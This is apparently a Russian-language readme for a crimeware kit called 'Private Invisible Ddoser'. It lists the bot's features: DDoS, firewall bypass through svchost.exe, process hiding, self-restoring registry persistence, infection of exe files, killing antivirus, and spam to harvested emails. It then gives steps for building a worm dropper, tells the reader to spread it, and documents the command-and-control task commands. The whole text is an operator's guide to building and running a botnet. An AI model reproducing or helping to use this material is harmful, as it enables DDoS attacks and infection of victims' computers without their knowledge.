Private Invisible Ddoser

Возможности:
1. Пинг, Урл ддос. Последнюю можно юзать для накрутки трафика.
2. Назначение бботам отдельных заданий
3. Обход файрвола через доверенный процесс - svchost.exe(по умолчанию)
4. Многопоточность.
5. Невидимость в процессах.
6. Нестандартная автозагрузка.
7. Закачка файлов.
8. У каждого бота свой уникальный ключ. Который можно изменить при форсированной перерегистрации.
9. Установка выбранного вами файла на ддос серверы.
10. Выполнение команд.
11. Посылка сообщения.
12. Заражение exe фалйлов
13. Убивать злые процессы
14. Убивать каспера
15. Убивать не нужные сервисы
16. Рассылка по найденным емейлам
17. Если его потерут из реестра то он автоматом прописывается в реестре(проверка каждые 10 секунд)
18. Все это в 13 килобайтах.


Назначение фалов.

ddoser.rar - читстый ддос сервер.
ddoser.exe - чистый файл ддос сервера, не запакованный весит 23 040 байт.
CONFIG.exe - прошивка урла в файл ddoser.exe.
Build.bat - создание присадки червя к вашему ддосу. Называется Worm.exe - размер 27 154 байт. При запуске
аттачит к себе ddoser.exe он должен быть уже настроен.
Worm/option.inc - Настройки ворма.
Worm/killer/svc.inc
Worm/killer/proc.inc
PMaster.exe - эта прога для выгрузки сервера, если вы вдруг решили испытать его на себе. )



Отредактируйте конфиги ворма. ( Worm/option.inc - Настройки ворма.)
Далее запускаете Build.bat.
Worm.exe - нужный вам файл. можете приступать к распространению.

Управление.

После установки сервер обращается к управляющему урлу и скрипт выдает ему его ключ и номер. По умолчанию скрипт получает 1 задание.
Написание файлов заданий. Примеры вы можете посмотреть в папке Task, туда вы можете заливать свои файлы конфигруации. Их имена должны быть
целыми числами. 

Команды

url - скрипт запрашивает определенный урл.
ping - пингует сервер.
sleep - сон
cmd - выполнение команды.
msg - сообщение юзверю.
die - умереть. Если запущен хайд лучше не использовать, траблы на компе пользователя обеспечены.

При параметре url и ping третий параметр значит количество раз, а четвертый задержку в милисекундах

Раздача заданий производится просто, вы берете номер конфига, вписываете его в форуму и указываете задание.
